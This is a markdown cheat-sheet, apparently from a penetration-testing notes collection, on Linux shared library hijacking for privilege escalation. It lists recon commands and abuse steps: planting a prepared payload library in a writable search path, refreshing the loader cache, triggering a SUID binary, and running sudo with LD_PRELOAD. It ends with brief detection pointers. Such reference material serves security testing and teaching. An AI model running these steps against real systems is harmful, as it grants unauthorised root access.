---
technique: Shared Library Hijacking
category: privilege-escalation
targets: Linux
tags: linux privilege-escalation suid shared-library ld-preload ldconfig
---

# Shared Library Hijacking

Shared library hijacking abuses writable library search paths, missing libraries, or preserved loader variables to execute attacker-controlled code in a higher-privileged context.

## Prerequisites

| Condition | Notes |
|-----------|-------|
| Writable library path | Required for RUNPATH, RPATH, or `ld.so.conf` abuse |
| Existing payload library | Keep source and payload construction in a tool note |
| Elevated execution path | SUID binaries and sudo rules are common triggers |

## Discovery

### Dynamic section

#sh #elf #recon

Print loader metadata for an ELF binary.

```sh title:"Print ELF dynamic section"
readelf -d "$binary_path"
```
<!-- cheat
var binary_path
-->

### Library resolution

#sh #elf #recon

Show which shared libraries a binary loads.

```sh title:"Resolve binary libraries"
ldd "$binary_path"
```
<!-- cheat
var binary_path
-->

### Missing library probes

#sh #strace #suid

Trace failed library lookups from a candidate binary.

```sh title:"Trace failed library loads"
strace -f -e trace=openat,access "$binary_path"
```
<!-- cheat
var binary_path
-->

### Loader configuration

#sh #ldconfig #recon

Print global dynamic loader search paths.

```sh title:"Print loader configuration"
cat /etc/ld.so.conf
```
<!-- cheat -->

### Loader include files

#sh #ldconfig #recon

List additional loader configuration files.

```sh title:"List loader include files"
ls -la /etc/ld.so.conf.d
```
<!-- cheat -->

### Writable library directories

#sh #filesystem #recon

Check whether a library search directory is writable.

```sh title:"Check library directory permissions"
ls -ld "$library_dir"
```
<!-- cheat
var library_dir
-->

## Abuse

### Step 1: Place payload library

#sh #shared-library

Copy a prepared shared object into the writable library path with the expected filename.

```sh title:"Place hijack library"
cp "$payload_so" "$writable_path/$library_name"
```
<!-- cheat
var payload_so
var writable_path
var library_name
-->

### Step 2: Refresh loader cache

#sh #ldconfig

Refresh the dynamic loader cache after changing a configured library directory.

```sh title:"Refresh loader cache"
ldconfig
```
<!-- cheat -->

### Step 3: Execute target binary

#sh #suid

Run the target binary to trigger the hijacked library load.

```sh title:"Execute library hijack target"
"$binary_path"
```
<!-- cheat
var binary_path
-->

### Sudo LD_PRELOAD

#sh #sudo #ld-preload

Run a permitted sudo command while preserving a prepared preload library.

```sh title:"Run sudo command with preload library"
sudo LD_PRELOAD="$payload_so" "$sudo_command"
```
<!-- cheat
var payload_so
var sudo_command
-->

## Detection

Investigate writable loader paths, unusual SUID library loads, `env_keep+=LD_PRELOAD`, and unexpected changes under `/etc/ld.so.conf.d`.
